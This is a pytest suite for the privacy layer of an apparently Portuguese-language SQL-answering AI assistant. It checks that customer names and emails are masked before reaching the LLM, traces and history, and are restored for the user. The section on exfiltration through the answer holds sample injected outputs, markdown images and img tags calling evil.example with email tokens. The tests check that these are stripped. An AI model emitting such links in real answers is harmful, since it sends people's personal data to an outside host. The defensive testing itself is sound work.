"""Personal data never reaches the LLM, the cache or the traces; the user still sees real values."""

from __future__ import annotations

import dataclasses
import sqlite3
from contextlib import closing
from pathlib import Path

import pytest

from src.agent.graph import Assistant
from src.agent.prompts import build_messages
from src.config import Settings
from src.observability import Tracer
from src.privacy import PROMPT_NOTE, Pseudonymizer, load_pseudonymizer, strip_external
from tests.unit.test_agent import FakeLLM, answer, query

PEOPLE = Pseudonymizer.from_rows(
    {
        "nome": ["Ana Lima", "João D'Ávila", "Bo"],
        "email": ["ana@example.com", "joao@example.net", "bo@example.org"],
    }
)


def first_client(db_path: Path) -> tuple[str, str]:
    with closing(sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)) as con:
        nome, email = con.execute("SELECT nome, email FROM clientes ORDER BY rowid LIMIT 1").fetchone()
    return str(nome), str(email)


@pytest.fixture
def settings(db_path: Path, tmp_path: Path) -> Settings:
    return dataclasses.replace(Settings.from_env(), db_path=db_path, trace_path=tmp_path / "traces.jsonl")


# ------------------------------------------------------------------ unit


def test_same_row_shares_the_number() -> None:
    assert PEOPLE.mask_cell("Ana Lima") == "[nome_1]"
    assert PEOPLE.mask_cell("ana@example.com") == "[email_1]"
    assert PEOPLE.mask_cell("joao@example.net") == "[email_2]"


def test_mask_finds_values_inside_text_ignoring_case() -> None:
    masked = PEOPLE.mask("Quanto ana lima gastou? Escreva para joao@example.net.")
    assert masked == "Quanto [nome_1] gastou? Escreva para [email_2]."


def test_short_values_only_masked_as_whole_cells() -> None:
    assert PEOPLE.mask("Bom dia, Bo") == "Bom dia, Bo"  # "Bo" is too short to search inside text
    assert PEOPLE.mask_cell("Bo") == "[nome_3]"


def test_non_personal_cells_are_untouched() -> None:
    assert PEOPLE.mask_rows([["São Paulo", 6, None], ["Ana Lima", 1.5, "App"]]) == [
        ["São Paulo", 6, None],
        ["[nome_1]", 1.5, "App"],
    ]


def test_unmask_round_trip_and_unknown_tokens() -> None:
    assert PEOPLE.unmask("[nome_1] ([email_1]) e [nome_99]") == "Ana Lima (ana@example.com) e [nome_99]"


def test_unmask_sql_escapes_quotes() -> None:
    sql = "SELECT email FROM clientes WHERE nome = '[nome_2]'"
    assert PEOPLE.unmask_sql(sql) == "SELECT email FROM clientes WHERE nome = 'João D''Ávila'"


def test_empty_pseudonymizer_is_identity() -> None:
    empty = Pseudonymizer()
    assert not empty.active
    assert empty.mask("Ana Lima") == "Ana Lima" and empty.unmask("[nome_1]") == "[nome_1]"


def test_loads_every_client_from_the_database(db_path: Path) -> None:
    privacy = load_pseudonymizer(db_path, {"clientes.nome", "clientes.email", "clientes.nao_existe"})
    nome, email = first_client(db_path)
    assert privacy.mask_cell(nome) == "[nome_1]" and privacy.mask_cell(email) == "[email_1]"
    assert sum(1 for t in privacy.to_value if t.startswith("[email_")) == 100


# ---------------------------------------------------------- agent wiring


def test_prompt_without_personal_data_is_unchanged() -> None:
    plain = build_messages("Clientes por estado?", "ctx", [], {}, max_rows=10, remaining_steps=3)
    masked = build_messages("Clientes por estado?", "ctx", [], {}, max_rows=10, remaining_steps=3, privacy=PEOPLE)
    assert [m.content for m in plain] == [m.content for m in masked]  # the LLM cache stays valid


def test_llm_never_sees_names_or_emails(settings: Settings) -> None:
    nome, email = first_client(settings.db_path)
    sql = "SELECT nome, email FROM clientes ORDER BY rowid LIMIT 3"
    llm = FakeLLM([query(sql), answer(sql, "O primeiro é [nome_1] ([email_1]).")])
    response = Assistant(llm, settings).ask(f"Qual o e-mail de {nome}?")
    prompts = "\n".join(llm.prompts)
    assert nome not in prompts and email not in prompts
    assert "[nome_1]" in prompts and PROMPT_NOTE in prompts
    assert response.answer == f"O primeiro é {nome} ({email})."  # the user sees real values
    assert response.data is not None and response.data.rows[0][0] == nome  # table and CSV too


def test_model_sql_with_token_runs_on_the_real_value(settings: Settings) -> None:
    nome, email = first_client(settings.db_path)
    sql = "SELECT email FROM clientes WHERE nome = '[nome_1]'"
    llm = FakeLLM([query(sql), answer(sql, "É [email_1].")])
    response = Assistant(llm, settings).ask("Qual o e-mail do cliente 1?")
    assert response.status == "answered" and response.data is not None
    assert response.data.rows == [[email]]
    assert response.steps[0].sql == f"SELECT email FROM clientes WHERE nome = '{nome}'"  # shown real in the UI
    assert nome not in llm.prompts[-1] and "[nome_1]" in llm.prompts[-1]  # history goes back masked


def test_trace_keeps_question_and_sql_masked(settings: Settings) -> None:
    nome, _ = first_client(settings.db_path)
    sql = "SELECT email FROM clientes WHERE nome = '[nome_1]'"
    tracer = Tracer(settings.trace_path)
    Assistant(FakeLLM([query(sql), answer(sql, "ok")]), settings, tracer=tracer).ask(f"E-mail de {nome}?")
    raw = settings.trace_path.read_text(encoding="utf-8")
    assert nome not in raw and "[nome_1]" in raw


def test_empty_history_keeps_prompt_identical() -> None:
    messages = build_messages("Q?", "ctx", [], {}, max_rows=10, remaining_steps=3, history=())
    assert messages[1].content == (  # byte for byte the prompt before memory existed: the LLM cache stays valid
        "ctx\n\n# Pergunta do usuário\nQ?\n\n# Passos até agora\nNenhum passo executado ainda.\n\n"
        "Você ainda tem 3 decisão(ões). Decida o próximo passo."
    )


def test_history_is_masked(settings: Settings) -> None:
    nome, email = first_client(settings.db_path)
    sql = "SELECT email FROM clientes WHERE nome = '[nome_1]'"
    llm = FakeLLM([query(sql), answer(sql, "É [email_1]."), query(sql), answer(sql, "Sim, [email_1].")])
    assistant = Assistant(llm, settings)
    first = assistant.ask(f"Qual o e-mail de {nome}?", thread_id="pii")
    assistant.ask("Tem certeza?", thread_id="pii")

    assert first.answer == f"É {email}."  # the user still sees the real value
    turn = assistant.history("pii")[0]
    stored = turn.model_dump_json()
    assert nome not in stored and email not in stored
    assert turn.question == "Qual o e-mail de [nome_1]?" and "'[nome_1]'" in turn.sql
    assert turn.answer == "É [email_1]." and turn.status == "answered"
    assert nome not in llm.prompts[-1] and email not in llm.prompts[-1]
    assert "Pergunta: Qual o e-mail de [nome_1]?" in llm.prompts[-1]


# ------------------------------------------- exfiltration through the answer (feedback 2026-11-14, 2.1)


def test_unmask_only_replaces_allowed_tokens() -> None:
    text = "[nome_1] e [email_2]"
    assert PEOPLE.unmask(text, allowed={"[nome_1]"}) == "Ana Lima e [email_2]"
    assert PEOPLE.tokens_in("[nome_1], [email_2] e [nome_1]") == {"[nome_1]", "[email_2]"}


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("Total: 17 ![.](https://evil.example/p.png?d=[email_1])", "Total: 17"),
        ("Veja ![x][ref]\n\n[ref]: https://evil.example/p.png", "Veja"),
        ("Detalhes [aqui](https://evil.example/?d=[email_1]).", "Detalhes aqui."),
        ("Fonte: https://evil.example/?d=1 ok", "Fonte: [link removido] ok"),
        ('<img src="https://evil.example/p.png"> fim', "fim"),
        ("Sem nada externo: 17 clientes.", "Sem nada externo: 17 clientes."),
    ],
)
def test_strip_external_content(text: str, expected: str) -> None:
    assert strip_external(text) == expected


def test_answer_cannot_exfiltrate_unseen_emails(settings: Settings, db_path: Path) -> None:
    with closing(sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)) as con:
        emails = [str(r[0]) for r in con.execute("SELECT email FROM clientes ORDER BY rowid LIMIT 3")]
    sql = "SELECT COUNT(*) AS total FROM clientes"
    injected = "100 clientes. ![.](https://evil.example/p.png?d=[email_1]|[email_2]|[email_3])"
    llm = FakeLLM([query(sql), answer(sql, injected)])
    response = Assistant(llm, settings).ask("Quantos clientes existem?")
    assert "evil.example" not in response.answer
    assert not any(e in response.answer for e in emails)
    assert response.answer.startswith("100 clientes.")


def test_tokens_from_the_turn_results_are_still_unmasked(settings: Settings) -> None:
    nome, email = first_client(settings.db_path)
    sql = "SELECT nome, email FROM clientes ORDER BY rowid LIMIT 1"
    llm = FakeLLM([query(sql), answer(sql, "É [nome_1] ([email_1]); [email_2] não apareceu.")])
    response = Assistant(llm, settings).ask("Quem é o primeiro cliente?")
    assert response.answer == f"É {nome} ({email}); [email_2] não apareceu."


# ------------------------------------------------------------------ derived values (2.3) and accents

SCHEMA = {"clientes": {"id": "INTEGER", "nome": "TEXT", "email": "TEXT", "estado": "TEXT"}}
PII = frozenset({"clientes.nome", "clientes.email"})


@pytest.mark.parametrize(
    ("sql", "expected"),
    [
        ("SELECT estado, COUNT(*) FROM clientes GROUP BY estado", set()),
        ("SELECT substr(nome, 1, 3) AS ini, estado FROM clientes", {0}),
        ("SELECT * FROM clientes", {1, 2}),
        ("SELECT c.estado, group_concat(c.email) FROM clientes AS c GROUP BY 1", {1}),
        ("WITH t AS (SELECT replace(email, '@', ' ') AS e FROM clientes) SELECT e FROM t", {0}),
        ("SELECT estado FROM clientes UNION SELECT nome FROM clientes", {0}),
        ("SELECT (SELECT max(nome) FROM clientes) AS m, 1 AS um", {0}),
    ],
)
def test_lineage_finds_columns_derived_from_personal_data(sql: str, expected: set[int]) -> None:
    from src.db.lineage import pii_derived_columns

    assert pii_derived_columns(sql, SCHEMA, PII) == frozenset(expected)


def test_lineage_is_conservative_when_it_cannot_parse() -> None:
    from src.db.lineage import pii_derived_columns

    assert pii_derived_columns("SELECT nome FROM clientes WHERE (((", SCHEMA, PII, width=2) == {0, 1}
    assert pii_derived_columns("SELECT estado FROM clientes WHERE (((", SCHEMA, PII, width=1) == frozenset()


def test_derived_cells_become_tokens_but_whole_tokens_stay() -> None:
    rows = [["Ana", "[x]", "ANA LIMA", "ana@example.com, joao@example.net", 3]]
    masked = PEOPLE.mask_rows(rows, derived={0, 2, 3, 4})
    first, second, third, fourth, fifth = masked[0]
    assert isinstance(first, str) and first.startswith("[derivado_") and "Ana" not in first
    assert second == "[x]"  # not a derived column
    assert third == "[nome_1]" and fourth == "[email_1], [email_2]" and fifth == 3
    assert PEOPLE.mask_rows(rows, derived={0}) == PEOPLE.mask_rows(rows, derived={0})  # deterministic
    assert PEOPLE.unmask(f"{first}!", extra=PEOPLE.derived_map(rows, {0})) == "Ana!"


def test_derived_token_is_keyed_by_the_data_not_a_bare_hash() -> None:
    other = Pseudonymizer.from_rows({"nome": ["Outra Pessoa"]})
    assert PEOPLE.derived_token("Ana") != other.derived_token("Ana")


def test_question_masking_ignores_accents() -> None:
    assert PEOPLE.mask("e o Joao D'Avila?") == "e o [nome_2]?"
    assert PEOPLE.mask("e o JOÃO D'ÁVILA?") == "e o [nome_2]?"
    assert PEOPLE.mask_cell("joao d'avila") == "[nome_2]"
    assert PEOPLE.mask("sem nomes aqui") == "sem nomes aqui"


def test_llm_never_sees_pieces_of_names(settings: Settings) -> None:
    nome, email = first_client(settings.db_path)
    first_name, user = nome.split()[0], email.split("@")[0]
    sql = (
        "SELECT substr(nome, 1, instr(nome, ' ') - 1) AS primeiro, substr(email, 1, instr(email, '@') - 1) AS u "
        "FROM clientes ORDER BY rowid LIMIT 1"
    )
    assistant = Assistant(FakeLLM([]), settings)
    token = assistant.privacy.derived_token(first_name)
    llm = FakeLLM([query(sql), answer(sql, f"Primeiro nome: {token}.")])
    assistant.llm = llm
    response = assistant.ask("Primeiro nome do primeiro cliente?")
    prompts = "\n".join(llm.prompts)
    assert f'"{first_name}"' not in prompts and f'"{user}"' not in prompts
    assert token in prompts
    assert response.answer == f"Primeiro nome: {first_name}."  # the user still sees the real value


def test_lineage_is_conservative_when_names_or_widths_do_not_match() -> None:
    from src.db.lineage import pii_derived_columns

    assert pii_derived_columns("SELECT estado AS x, nome AS x FROM clientes", SCHEMA, PII) == {0, 1}
    assert pii_derived_columns("SELECT nome FROM clientes", SCHEMA, PII, width=2) == {0, 1}
